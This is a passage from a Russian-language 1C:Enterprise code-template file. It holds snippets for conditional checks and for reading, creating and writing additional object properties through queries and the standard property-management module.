Если лТипЗнч<?""Переменная для проверки""> = Тип(""Строка"") Тогда
	<?>
ИначеЕсли лТипЗнч<?""Переменная для проверки""> = Тип(""Массив"") Тогда
	
ИначеЕсли лТипЗнч<?""Переменная для проверки""> = Тип(""ДокументСсылка.РеализацияТоваров"") Тогда
	
КонецЕсли;"}
},
{0,
{"Если Неопределено",0,0,"ЕслиН[еопред]","Если <?""Условие""> <> Неопределено Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Элемент.ТекущиеДанные <> Неопределено",0,0,"ЕслиЭТД[Н]","Если Элемент.ТекущиеДанные <> Неопределено Тогда
	лТекущиеДанные<?> 	= Элемент.ТекущиеДанные;
КонецЕсли;"}
},
{0,
{"Если Неопределено И Количество <> 0 ",0,0,"ЕслиНК[оличество]","Если <?""Имя элемента для подсчета количества (слитно)""> <> Неопределено Тогда
	Если <?""Имя элемента для подсчета количества (слитно)"">.Количество() > 0 Тогда
		<?>
	КонецЕсли; 
КонецЕсли;"}
},
{0,
{"Если Параметры.Свойство",0,0,"ЕслиП[араметр]","Если Параметры.Свойство(""<?""ИмяСвойства"">"") Тогда
	лПараметр<?""ИмяСвойства""> = Параметры.<?""ИмяСвойства"">;
КонецЕсли;"}
},
{0,
{"Если >  (Больше)",0,0,"ЕслиБ","Если <?""Имя элемента""> > <?> Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если > 0 (БольшеНуля)",0,0,"ЕслиБН","Если <?""Имя элемента""> > 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если <  (Меньше)",0,0,"ЕслиМ","Если <?""Имя элемента""> < <?> Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если < 0 (МеньшеНуля)",0,0,"ЕслиМН","Если <?""Имя элемента""> < 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Четное",0,0,"ЕслиЧ","Если <?""Имя элемента""> % 2 = 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если НеЧетное",0,0,"ЕслиНЧ","Если <?""Имя элемента""> % 2 <> 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Строка = """"",0,0,"ЕслиС[тр]","Если Строка(<?""Имя элемента(слитно)"">) = """" Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Количество <> 0",0,0,"ЕслиК[оличество]","Если <?""Имя элемента для подсчета количества (слитно)"">.Количество() <> 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если ВвестиСтроку",0,0,"ЕслиВС[тр]","Если ВвестиСтроку(Текст, Подсказка, 0, Истина) Тогда
	
КонецЕсли;"}
},
{0,
{"Если Количество <> 0  с локальной переменной",0,0,"ЕслиЛК[оличество]","л<?""Имя элемента для подсчета количества (слитно)"">Количество = <?""Имя элемента для подсчета количества (слитно)"">.Количество(); 
Если л<?""Имя элемента для подсчета количества (слитно)"">Количество <> 0 Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если СтрНайти() > 0 (есть строка)",0,0,"ЕслиСН","Если СтрНайти(<?""Имя строки (слитно)"">) > 0 Тогда
	
КонецЕсли;"}
},
{0,
{"Если СтрНайти() > 0 (есть строка) с локальной переменной",0,0,"ЕслиЛСН","лСтрНомер 	= СтрНайти(<?""Имя строки (слитно)"">);
Если лСтрНомер > 0 Тогда
	
КонецЕсли;"}
},
{0,
{"Если ТЗ.Найти() <> Неопределено",0,0,"ЕслиНа[йти]","Если <?""Имя таблицы (слитно)"">.Найти(<?>) <> Неопределено Тогда
	
КонецЕсли;"}
},
{0,
{"Если ТЗ.Найти() <> Неопределено с локальной переменной",0,0,"ЕслиЛТЗН","лЭлем 	= <?""Имя таблицы (слитно)"">.Найти(<?>);
Если лЭлем <> Неопределено Тогда
	
КонецЕсли;"}
},
{0,
{"Если Следующий() (для запроса)",0,0,"ЕслиСл[едующий]","Если <?""Имя элемента для условия (слитно)"">.Следующий() Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Свойство",0,0,"ЕслиСв[ойство]","Если <?""Имя структуры для проверки свойства"">.Свойство(""Свойство"") Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Свойство и Значение",0,0,"ЕслиСвЗнач","л<?""Свойство структуры (слитно вроде и по её правилам)""> 	= Неопределено;
Если Структура.Свойство(""<?""Свойство структуры (слитно вроде и по её правилам)"">"", л<?""Свойство структуры (слитно вроде и по её правилам)"">) Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Свойство Булево",0,0,"ЕслиСвБул","Если Структура.Свойство(""<?""Свойство структуры (слитно вроде и по её правилам)"">"") Тогда
	Если Структура.<?""Свойство структуры (слитно вроде и по её правилам)""> Тогда
		<?>
	КонецЕсли;
КонецЕсли;"}
},
{0,
{"Если Вопрос",0,0,"ЕслиВ[опрос]","Если Вопрос(""<?""Тест вопроса"">"", РежимДиалогаВопрос.ДаНет) = КодВозвратаДиалога.Да Тогда
	<?>
КонецЕсли;"}
},
{0,
{"Если Роль Доступна",0,0,"ЕслиРД","Если РольДоступна(""<?""Имя роли (слитно)"">"") Тогда
	
КонецЕсли;"}
},
{0,
{"Однострочное условие ?(",0,0,"?(","?(<?""Условие"">, <?>,);"}
},
{0,
{"Однострочное условие ЗначениеЗаполнено",0,0,"?З","?(ЗначениеЗаполнено(<?""Значение на проверку заполненности"">), <?>,);"}
},
{0,
{"Однострочное условие ПустаяСтрока",0,0,"?П","?(ПустаяСтрока(<?""Имя переменной со строкой"">), <?>,);"}
},
{0,
{"Однострочное условие ТипЗнч",0,0,"?Т","?(ТипЗнч(<?""Переменная для проверки"">) = Тип(""Строка""), <?>,);"}
},
{0,
{"Однострочное условие Неопределено",0,0,"?Н","?(<?""Условие""> <> Неопределено, <?>,);"}
},
{0,
{"Однострочное условие Количество <> 0",0,0,"?К","?(<?""Имя элемента для подсчета количества (слитно)"">.Количество <> 0, <?>,);"}
},
{0,
{"Однострочное условие СтрНайти > 0 (есть строка)",0,0,"?СтрН","?(<?""Имя строки (слитно)"">.СтрНайти() > 0, <?>,);"}
},
{0,
{"Однострочное условие ТЗ.Найти <> Неопределено",0,0,"?ТЗН","?(<?""Имя таблицы (слитно)"">.Найти(<?>) <> Неопределено, <?>,);"}
},
{0,
{"Пока Следующий() (для запроса)",0,0,"ПокаС[ледующий]","Пока <?""Имя элемента для условия (слитно)"">.Следующий() Цикл
	
	<?>
	
КонецЦикла;"}
},
{0,
{"ЗаполнитьЗначенияСвойств",0,0,"ЗЗС[войств]","ЗаполнитьЗначенияСвойств(<?>,);"}
},
{0,
{"Возврат Неопределено",0,0,"ВН[еопределено]","Возврат Неопределено;"}
}
},
{3,
{"Дополнительные реквизиты",1,0,"",""},
{8,
{"Реквизиты (они в ТЧ объекта)",1,0,"",""},
{0,
{"Типове по наименованию доп свойства",0,0,"Свойство","лТЗСвойств<?""Смысл дополнительного реквизита (слитно)""> 	= УправлениеСвойствами.ЗначенияСвойств(лОбъект,, Ложь, ""УникальноеИмяДополнительногоСвойства"");

лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">Значение 	= Неопределено;
Если ЗначениеЗаполнено(лТЗСвойств<?""Смысл дополнительного реквизита (слитно)"">) Тогда
	Если лТЗСвойств<?""Смысл дополнительного реквизита (слитно)"">.Количество() = 1 Тогда
		лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">Значение 	= лТЗСвойств<?""Смысл дополнительного реквизита (слитно)"">[0].Значение; //Получаем текущее значение свойства
	КонецЕсли;	
КонецЕсли;"}
},
{0,
{"Типовые УНФ",0,0,"","УправлениеСвойствами.ПолучитьСписокСвойств
УправлениеСвойствами.ПолучитьЗначенияСвойств
УправлениеСвойствами.ПроверитьСвойствоУОбъекта"}
},
{0,
{"Типовое использование (получая несколько свойств) (ЗУП 3)",0,0,"ДопРеквизитМасс","лЗначенияДопРеквизитов<?""Имя подумента с доп свойствами (слитно)""> 	= УправлениеСвойствами.ЗначенияСвойств(МассивОбъектов, Истина, Ложь);
лДопРеквизит<?""Смысл дополнительного реквизита (слитно)""> 	= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(""Основание приказа (Приемы на работу)"");

лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">Значение 	= Неопределено;
Если ЗначениеЗаполнено(лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">) Тогда
	лСтруктураНайтиСтроки 	= Новый Структура(""ВладелецСвойств, Свойство"", Объект.Ссылка, лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">);
	лМассивЗначенийСвойств 	= лЗначенияДопРеквизитов<?""Имя подумента с доп свойствами (слитно)"">.НайтиСтроки(лСтруктураНайтиСтроки);
	
	Если лМассивЗначенийСвойств.Количество() > 0 Тогда
		лМассивЗначенийСвойствЗначение = лМассивЗначенийСвойств[0].Значение;
		Если ЗначениеЗаполнено(лМассивЗначенийСвойствЗначение) Тогда
			лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">Значение 	= лМассивЗначенийСвойствЗначение;
		КонецЕсли; 
	КонецЕсли;	
КонецЕсли; 
"}
},
{0,
{"Типовое. Присвоить значение реквизиту (ЗаписатьСвойстваУОбъекта)",0,0,"ДопРекв","Если лОбъект <> Неопределено Тогда
	лИмяДопРеквизит 			= ""<?""Имя реквизита (слитно)"">"";
	лДопРеквизит<?""Имя реквизита (слитно)""> 			= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(лИмяДопРеквизит);
	лМассивДопРеквизит 			= Новый Массив;
	лМассивДопРеквизит.Добавить(лДопРеквизит<?""Имя реквизита (слитно)"">);
	
	лЗначенияДопРеквизит<?""Имя элемента с доп свойствами (слитно)""> 	= УправлениеСвойствами.ЗначенияСвойств(лОбъект,, Ложь, лМассивДопРеквизит);
	
	Если лЗначенияДопРеквизит<?""Имя элемента с доп свойствами (слитно)"">.Количество() > 0 Тогда
		лЕстьСвойство<?""Имя реквизита (слитно)""> 			= УправлениеСвойствами.ПроверитьСвойствоУОбъекта(лОбъект, лДопРеквизит<?""Имя реквизита (слитно)"">);
		Если лЕстьСвойство<?""Имя реквизита (слитно)""> Тогда
			Если ЗначениеЗаполнено(лДопРеквизит<?""Имя реквизита (слитно)"">) Тогда
				лСтруктураНайтиСтроки 	= Новый Структура(""ВладелецСвойств, Свойство"", лОбъект, лДопРеквизит<?""Имя реквизита (слитно)"">);
				лМассивЗначенийСвойств 	= лЗначенияДопРеквизит<?""Имя элемента с доп свойствами (слитно)"">.НайтиСтроки(лСтруктураНайтиСтроки);
				
				Если лМассивЗначенийСвойств.Количество() = 1 Тогда
					//лЗначение = лМассивЗначенийСвойств[0].Значение; //Получаем текущее значение свойства
					лМассивЗначенийСвойств[0].Значение 	= 2; //Изменяем значение свойства
					УправлениеСвойствами.ЗаписатьСвойстваУОбъекта(лОбъект, лЗначенияДопРеквизит<?""Имя элемента с доп свойствами (слитно)"">);
				КонецЕсли;	
			КонецЕсли;
		КонецЕсли;	
	КонецЕсли;
КонецЕсли;

"}
},
{0,
{"Типовое. Есть свойство (ПроверитьСвойствоУОбъекта)",0,0,"","лИмяДопРеквизита 				= ""<?""Имя реквизита"">"";
лДопРеквизит<?""Имя реквизита""> 	= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(лИмяДопРеквизита);

лЕстьСвойство<?""Имя реквизита""> 			= УправлениеСвойствами.ПроверитьСвойствоУОбъекта(лОбъект, лДопРеквизит<?""Имя реквизита"">);
"}
},
{0,
{"ДополнительныеРеквизиты через ТЧ",0,0,"","НайденноеСвойствоТЧ = Сделка.ДополнительныеРеквизиты.Найти(ИнформацияОСтатусах.СвойствоЗаказов, ""Свойство"");
Если НайденноеСвойствоТЧ = Неопределено тогда
	НовыйРеквизит = Сделка.ДополнительныеРеквизиты.Добавить();
	НовыйРеквизит.Свойство = ИнформацияОСтатусах.СвойствоЗаказов;
	НовыйРеквизит.Значение = ЗначениеСвойства;
Иначе
	НайденноеСвойствоТЧ.Значение = ЗначениеСвойства;	
КонецЕсли;"}
},
{0,
{"ДополнительныеРеквизиты через ТЧ (получив свойство по ""Имени разработчика"")",0,0,"","лДопРеквизит_<?""ИмяДопРеквизит (слитно, вроде)""> = ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоРеквизиту(""Имя"", ""<?""ИмяДопРеквизит (слитно, вроде)"">"");
Если ЗначениеЗаполнено(лДопРеквизит_<?""ИмяДопРеквизит (слитно, вроде)"">) Тогда
	лОбъект 	= Номенклатура.ПолучитьОбъект();
	лСвойство_<?""ИмяДопРеквизит (слитно, вроде)""> = лОбъект.ДополнительныеРеквизиты.Найти(лДопРеквизит_<?""ИмяДопРеквизит (слитно, вроде)"">, ""Свойство"");
	
	Если ЗначениеЗаполнено(лСвойство_<?""ИмяДопРеквизит (слитно, вроде)"">) Тогда
		лЗначениеСвойства = """";
		Если лСвойство_<?""ИмяДопРеквизит (слитно, вроде)""> = Неопределено тогда
			НовыйРеквизит = лОбъект.ДополнительныеРеквизиты.Добавить();
			НовыйРеквизит.Свойство = лСвойство_<?""ИмяДопРеквизит (слитно, вроде)"">;
			НовыйРеквизит.Значение = лЗначениеСвойства;
		Иначе
			лСвойство_<?""ИмяДопРеквизит (слитно, вроде)"">.Значение = лЗначениеСвойства;	
		КонецЕсли;	
		
		лОбъект.Записать();
	КонецЕсли; 
КонецЕсли; 
"}
},
{0,
{"Типовое использование 1 свойства (ЗУП 3)",0,0,"","Функция ПолучитьСвойство<?""Смысл дополнительного реквизита (слитно)"">(пСсылка, НаименованиеПВХ = """", ДописатьВНачало = """", ДописатьВКонец = """")
	
	лРезультат = """";
	
	Если ПустаяСтрока(НаименованиеПВХ) Тогда			   
		Возврат """";
	КонецЕсли;
	
	лДопРеквизит<?""Смысл дополнительного реквизита (слитно)""> 	= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(НаименованиеПВХ); //Вида: ""Основание приказа (Приемы на работу)""

	Если ЗначениеЗаполнено(лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">) Тогда
		лЗначениеСвойства<?""Смысл дополнительного реквизита (слитно)""> 		= УправлениеСвойствами.ЗначениеСвойства(пСсылка, лДопРеквизит<?""Смысл дополнительного реквизита (слитно)"">); //Вернёт чисто значение
		
		Если ЗначениеЗаполнено(лЗначениеСвойства) Тогда
			Если НЕ ПустаяСтрока(ДописатьВНачало) Тогда			   
				лРезультат 	= ДописатьВНачало + лЗначениеСвойства<?""Смысл дополнительного реквизита (слитно)"">;	
			КонецЕсли;
			Если НЕ ПустаяСтрока(ДописатьВКонец) Тогда			   
				лРезультат 	= лЗначениеСвойства<?""Смысл дополнительного реквизита (слитно)""> + ДописатьВКонец;	
			КонецЕсли;
		КонецЕсли; 
	КонецЕсли;
	
	Возврат лРезультат;
	
КонецФункции // ПолучитьСвойство<?""Смысл дополнительного реквизита (слитно)"">()"}
}
},
{2,
{"Свойства (сведения) (они в отдельном регистре)",1,0,"",""},
{0,
{"! НЕ рабоатет! Типовое. Присвоить значение свойству (ЗаписатьСвойстваУОбъекта)",0,0,"","лИмяДопСвойство 			= ""<?""Имя свойства (слитно)"">"";
лДопСвойство<?""Имя свойства (слитно)""> 			= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(лИмяДопСвойство);
лМассивДопСвойство 			= Новый Массив;
лМассивДопСвойство.Добавить(лДопСвойство<?""Имя свойства (слитно)"">);

лЗначенияДопСвойство<?""Имя элемента с доп свойствами (слитно)""> 	= УправлениеСвойствами.ЗначенияСвойств(лОбъект,, Ложь, лМассивДопСвойство);

Если лЗначенияДопСвойство<?""Имя элемента с доп свойствами (слитно)"">.Количество() > 0 Тогда
	лЕстьСвойство<?""Имя свойства (слитно)""> 			= УправлениеСвойствами.ПроверитьСвойствоУОбъекта(лОбъект, лДопСвойство<?""Имя свойства (слитно)"">);
	Если лЕстьСвойство<?""Имя свойства (слитно)""> Тогда
		Если ЗначениеЗаполнено(лДопСвойство<?""Имя свойства (слитно)"">) Тогда
			лСтруктураНайтиСтроки 	= Новый Структура(""ВладелецСвойств, Свойство"", лОбъект, лДопСвойство<?""Имя свойства (слитно)"">);
			лМассивЗначенийСвойств 	= лЗначенияДопСвойство<?""Имя элемента с доп свойствами (слитно)"">.НайтиСтроки(лСтруктураНайтиСтроки);
			
			Если лМассивЗначенийСвойств.Количество() = 1 Тогда
				//лЗначение = лМассивЗначенийСвойств[0].Значение; //Получаем текущее значение свойства
				лМассивЗначенийСвойств[0].Значение 	= 2; //Изменяем значение свойства
				УправлениеСвойствами.ЗаписатьСвойстваУОбъекта(лОбъект, лЗначенияДопСвойство<?""Имя элемента с доп свойствами (слитно)"">);
			КонецЕсли;	
		КонецЕсли;
	КонецЕсли;	
КонецЕсли; 
	

"}
},
{0,
{"СоздатьПолучитьСвойство",0,0,"","Функция СоздатьПолучитьСвойство() 
	
	НаименованиеСвойства = ""Направление сделки Битрикс24"";
	
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""НаименованиеСвойства"", НаименованиеСвойства);
	Запрос.Текст = ""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ДополнительныеРеквизитыИСведения.Ссылка КАК Ссылка
	|ИЗ
	|	ПланВидовХарактеристик.ДополнительныеРеквизитыИСведения КАК ДополнительныеРеквизитыИСведения
	|ГДЕ
	|	ДополнительныеРеквизитыИСведения.Заголовок = &НаименованиеСвойства
	|	И ДополнительныеРеквизитыИСведения.НаборСвойств = ЗНАЧЕНИЕ(Справочник.НаборыДополнительныхРеквизитовИСведений.Документ_СчетНаОплатуПокупателю)""; // АйТи КучеровРМ 
	ВыполненныйЗапрос = Запрос.Выполнить();	
	
	Если ВыполненныйЗапрос.Пустой() Тогда
		
		СвойствоОбъект 	= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.СоздатьЭлемент();
		СвойствоОбъект.Комментарий 	= НСтр(""ru = 'Создано автоматически при синхронизации с Битрикс24'"");
		СвойствоОбъект.Наименование = НаименованиеСвойства + "" (Заказ покупателя)"";
		СвойствоОбъект.Заголовок 	= НаименованиеСвойства;
		СвойствоОбъект.ЗаголовокФормыВыбораЗначения = НаименованиеСвойства;
		СвойствоОбъект.ЗаголовокФормыЗначения 		= НаименованиеСвойства;
		СвойствоОбъект.НаборСвойств = Справочники.НаборыДополнительныхРеквизитовИСведений.Документ_СчетНаОплатуПокупателю; // АйТи КучеровРМ 
		
		
		лТип = Тип(""СправочникСсылка.ЗначенияСвойствОбъектов"");
		МассивТипов = Новый Массив;
		МассивТипов.Добавить(лТип);
		
		СвойствоОбъект.ЭтоДополнительноеСведение = Истина; // АйТи КучеровРМ
		СвойствоОбъект.ТипЗначения 	= Новый ОписаниеТипов(МассивТипов);
		СвойствоОбъект.Доступен 	= Ложь;
		СвойствоОбъект.Виден 		= Ложь;
		СвойствоОбъект.ДополнительныеЗначенияИспользуются 	= Истина;
		СвойствоОбъект.ДополнительныеСвойства.Вставить(""ЗагрузкаСБитрикс24"", Истина);
		СвойствоОбъект.Записать();
		СвойствоСсылка = СвойствоОбъект.Ссылка; 
		
		лНабор = Справочники.НаборыДополнительныхРеквизитовИСведений.Документ_СчетНаОплатуПокупателю.ПолучитьОбъект(); // АйТи КучеровРМ
		лНабор.ДополнительныеСведения.Добавить().Свойство = СвойствоСсылка; //Или ДополнительныеРеквизиты
		лНабор.Записать();
		
		СвойствоСсылка =  СвойствоСсылка; 
		
	Иначе
		
		Выборка = ВыполненныйЗапрос.Выбрать();
		
		Пока Выборка.Следующий() Цикл
			СвойствоСсылка = Выборка.Ссылка; 
		КонецЦикла;
		
	КонецЕсли;
	
	Возврат СвойствоСсылка;
	
КонецФункции"}
}
},
{6,
{"ЗначенияСвойствОбъектов",1,0,"",""},
{0,
{"Список значений свойства",0,0,"","Функция ПолучитьЗначениеСвойства(КодСвойства, КодЗначенияСвойства = """")

	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ЗначенияСвойствОбъектов.Ссылка,
	|	ЗначенияСвойствОбъектов.ВерсияДанных,
	|	ЗначенияСвойствОбъектов.ПометкаУдаления,
	|	ЗначенияСвойствОбъектов.Предопределенный,
	|	ЗначенияСвойствОбъектов.Владелец,
	|	ЗначенияСвойствОбъектов.Родитель,
	|	ЗначенияСвойствОбъектов.ЭтоГруппа,
	|	ЗначенияСвойствОбъектов.Код,
	|	ЗначенияСвойствОбъектов.Наименование
	|ИЗ
	|	Справочник.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|ГДЕ
	|	ЗначенияСвойствОбъектов.Владелец.Код = &КодСвойства 
	|	И ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства"";
	
	// Чтобы вывести все возмножные значения свойства, надо убрать ""ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства""
	
	Запрос.УстановитьПараметр(""КодЗначенияСвойства""	, КодЗначенияСвойства);
	Запрос.УстановитьПараметр(""КодСвойства""			, КодСвойства);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Неопределено;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			ВыборкаДетальныеЗаписиСсылка = ВыборкаДетальныеЗаписи.Ссылка;
			ЗначениеСвойства = ВыборкаДетальныеЗаписиСсылка;
		КонецЕсли;
	КонецЕсли;

	Возврат ЗначениеСвойства;
	
КонецФункции // ПолучитьЗначениеЗначениеСвойства()
 "}
},
{0,
{"ПолучитьЗначениеСвойстваОбъекта",0,0,"","//Функция ПолучитьЗначениеСвойстваОбъекта
//-------------------------------------------------------------------------
//Параметры:
//		Объект - Ссылка - Ссылка на объект, свойство которого надо получить
//		КодСвойстваОбъекта - Строка - Код свойства, значения которого получаем
//		НазначениеСвойств - ПланВидовХарактеристикСсылка.НазначенияСвойствКатегорийОбъектов - Напр., ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты
//Возвращаемое значение:
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства
//-------------------------------------------------------------------------
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойстваОбъекта(Объект, КодСвойстваОбъекта, НазначениеСвойств)
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	СвойстваОбъектов.Наименование КАК СвойстваОбъектовНаименование,
	|	СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления,
	|	СвойстваОбъектов.Ссылка КАК Свойство,
	|	ЗначенияСвойствОбъектов.Значение КАК Значение
	|ИЗ
	|	(ВЫБРАТЬ
	|		СвойстваОбъектов.Ссылка КАК Ссылка,
	|		СвойстваОбъектов.Наименование КАК Наименование,
	|		СвойстваОбъектов.ПометкаУдаления КАК ПометкаУдаления
	|	ИЗ
	|		ПланВидовХарактеристик.СвойстваОбъектов КАК СвойстваОбъектов
	|	ГДЕ
	|		СвойстваОбъектов.НазначениеСвойства В(&НазначениеСвойств)) КАК СвойстваОбъектов
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|		ПО (ЗначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Объект = &ОбъектОтбораЗначений)
	|		ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.НазначенияСвойствОбъектов КАК НазначенияСвойствОбъектов
	|		ПО (НазначенияСвойствОбъектов.Свойство = СвойстваОбъектов.Ссылка)
	|			И (ЗначенияСвойствОбъектов.Значение ЕСТЬ NULL )
	|ГДЕ
	|	(НазначенияСвойствОбъектов.Объект ЕСТЬ NULL 
	|			ИЛИ НазначенияСвойствОбъектов.Объект В (&СписокНазначенийСвойств))
	|	И СвойстваОбъектов.Ссылка.Код = &КодСвойстваОбъекта
	|
	|УПОРЯДОЧИТЬ ПО
	|	СвойстваОбъектовНаименование"";
	
	//КодСвойстваОбъекта 		= ""00000000048"";
	//НазначениеСвойств 		= ПланыВидовХарактеристик.НазначенияСвойствКатегорийОбъектов.Справочник_Контрагенты;
	ОбъектОтбораЗначений 	= Объект;
	СписокНазначенийСвойств = Объект;
	
	Запрос.УстановитьПараметр(""КодСвойстваОбъекта""	, КодСвойстваОбъекта);
	Запрос.УстановитьПараметр(""НазначениеСвойств""	, НазначениеСвойств);
	Запрос.УстановитьПараметр(""ОбъектОтбораЗначений"", ОбъектОтбораЗначений);
	Запрос.УстановитьПараметр(""СписокНазначенийСвойств"", СписокНазначенийСвойств);

	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Неопределено;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			ВыборкаДетальныеЗаписиЗначение = ВыборкаДетальныеЗаписи.Значение;
			Если ВыборкаДетальныеЗаписиЗначение <> NULL Тогда
				ЗначениеСвойства = ВыборкаДетальныеЗаписиЗначение;
			Иначе
				ЗначениеСвойства = Неопределено;
			КонецЕсли
		КонецЕсли;
	КонецЕсли;

	Возврат ЗначениеСвойства;
	
КонецФункции // ПолучитьЗначениеСвойстваОбъекта()

"}
},
{0,
{"ЗаписатьЗначенияСвойства",0,0,"","Функция ЗаписатьЗначенияСвойства(ОбъектСсылка, СтруктураСвойства) 
	
	НаборЗаписейЗначенияСвойств = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();
	
	Если ЗначениеЗаполнено(СтруктураСвойства.Значение) Тогда
		Запись 			= НаборЗаписейЗначенияСвойств.Добавить();
		Запись.Объект   = ОбъектСсылка;
		Свойство 		= ПланыВидовХарактеристик.СвойстваОбъектов.НайтиПоКоду(СтруктураСвойства.КодСвойстваОбъекта);
		Запись.Свойство = Свойство.Ссылка;
		Запись.Значение = СтруктураСвойства.Значение;
	КонецЕсли;
	
	НаборЗаписейЗначенияСвойств.Отбор.Объект.Установить(ОбъектСсылка);
	НаборЗаписейЗначенияСвойств.Отбор.Свойство.Установить(Свойство); //.Ссылка
	
	Попытка
		НаборЗаписейЗначенияСвойств.Записать();
	Исключение
		Предупреждение(""Не удалось записать значения свойств:"" + Символы.ПС + ОписаниеОшибки());
		Возврат Ложь;
	КонецПопытки;
	
	Возврат Истина; 
	
КонецФункции

СтруктураСвойства = Новый Структура;
//СтруктураСвойства.Вставить(""Свойство"", ИмяСвойства);
СтруктураСвойства.Вставить(""КодСвойстваОбъекта"", КодСвойстваОбъекта);
СтруктураСвойства.Вставить(""Значение"", ЗначениеСвойства);


"}
},
{0,
{"ПолучитьЗначениеСвойства Или нескольких",0,0,"","//Функция ПолучитьЗначениеСвойства
//-------------------------------------------------------------------------
//Параметры:
//		КодСвойства - Строка - КодСвойства
//		КодЗначенияСвойства - Строка - КодЗначенияСвойства
//Возвращаемое значение:
//		Массив - Массив Значений заданного свойства, с типом СправочникСсылка.ЗначенияСвойствОбъектов
//		СправочникСсылка.ЗначенияСвойствОбъектов - Значение свойства, если получаем 1 элемент по коду
//		Неопределено - Если элементов 0
//-------------------------------------------------------------------------
// Если КодЗначенияСвойства пустой, то вернёт все значения свойства,
// иначе вернёт свойство по заданному коду
//------------------------------------------------------------------------- 
//автор: КучеровРМ 07.09.2018 
Функция ПолучитьЗначениеСвойства(КодСвойства, КодЗначенияСвойства = """")

	КодЗначенияСвойстваЗаполнен = НЕ ПустаяСтрока(КодЗначенияСвойства);
	Если КодЗначенияСвойстваЗаполнен Тогда
		ЗапросВЫБРАТЬ = ""ПЕРВЫЕ 1"";
		ЗапросКодЗначенияСвойства = ""
		|	И ЗначенияСвойствОбъектов.Код = &КодЗначенияСвойства"";
	Иначе
		ЗапросВЫБРАТЬ = """";
		ЗапросКодЗначенияСвойства = """";
	КонецЕсли;
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ "" + ЗапросВЫБРАТЬ + ""
	|	ЗначенияСвойствОбъектов.Ссылка,
	|	ЗначенияСвойствОбъектов.ВерсияДанных,
	|	ЗначенияСвойствОбъектов.ПометкаУдаления,
	|	ЗначенияСвойствОбъектов.Предопределенный,
	|	ЗначенияСвойствОбъектов.Владелец,
	|	ЗначенияСвойствОбъектов.Родитель,
	|	ЗначенияСвойствОбъектов.ЭтоГруппа,
	|	ЗначенияСвойствОбъектов.Код,
	|	ЗначенияСвойствОбъектов.Наименование
	|ИЗ
	|	Справочник.ЗначенияСвойствОбъектов КАК ЗначенияСвойствОбъектов
	|ГДЕ
	|	ЗначенияСвойствОбъектов.Владелец.Код = &КодСвойства"";
	
	Если КодЗначенияСвойстваЗаполнен Тогда // Значит выводим одно значение соогласно переданому коду
		Запрос.Текст = Запрос.Текст + ЗапросКодЗначенияСвойства;
		Запрос.УстановитьПараметр(""КодЗначенияСвойства"", КодЗначенияСвойства);
	КонецЕсли;
	
	Запрос.УстановитьПараметр(""КодСвойства"", КодСвойства);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ЗначениеСвойства = Новый Массив;
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Пока ВыборкаДетальныеЗаписи.Следующий() Цикл
			ВыборкаДетальныеЗаписиСсылка = ВыборкаДетальныеЗаписи.Ссылка;
			ЗначениеСвойства.Добавить(ВыборкаДетальныеЗаписиСсылка);
			
